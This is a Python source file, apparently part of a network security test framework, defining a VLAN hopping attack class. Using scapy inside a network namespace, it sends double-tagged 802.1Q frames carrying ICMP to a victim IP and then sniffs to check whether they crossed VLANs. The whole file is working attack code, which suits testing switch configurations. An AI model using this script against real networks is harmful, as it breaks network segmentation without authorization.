from attacks.attack import Attack
from lib.connectivity import get_async_sniffer
import scapy.all as scapy
import netns
import ipaddress


class VlanHopping(Attack):
    def setup(self) -> None:
        self.sniff = get_async_sniffer(self.interfaces, 3, 'icmp')
        self.sniff.start()

    def attack(self) -> None:
        with netns.NetNS(nsname='host1'):
            scapy.conf.ifaces.reload()
            scapy.conf.route.resync()
            packet = (scapy.Ether(src=self.ethersrc, dst=self.etherdst)
                     / scapy.Dot1Q(vlan=self.native_vlan)
                     / scapy.Dot1Q(vlan=self.victim_vlan)
                     / scapy.IP(dst=self.victim_ip)
                     / scapy.ICMP())
            packet_list = []
            for i in range(10):
                packet_list.append(packet)
            scapy.sendp(packet_list, inter=0.5)

    def result(self) -> bool:
        self.sniff.stop()
        print('VLAN Sniffing result:')
        print(self.sniff.results.res)
        for result in self.sniff.results.res:
            if result.dst == self.etherdst \
                and result.src == self.ethersrc \
                and result.type == 2048:
                return True

        return False

    def run(self):
        self.ethersrc = self.interfaces[1].mac
        self.etherdst = self.interfaces[3].mac
        self.setup()
        self.attack()
        return self.result()

    def __init__(self,
                 interfaces: list[scapy.NetworkInterface],
                 ip4network: ipaddress.IPv4Network,
                 victim_ip = '192.168.3.4',
                 native_vlan: int = 1 ,
                 victim_vlan: int = 2,
                 ):
        super().__init__(interfaces, ip4network)
        self.native_vlan = native_vlan
        self.victim_vlan = victim_vlan
        self.victim_ip = victim_ip
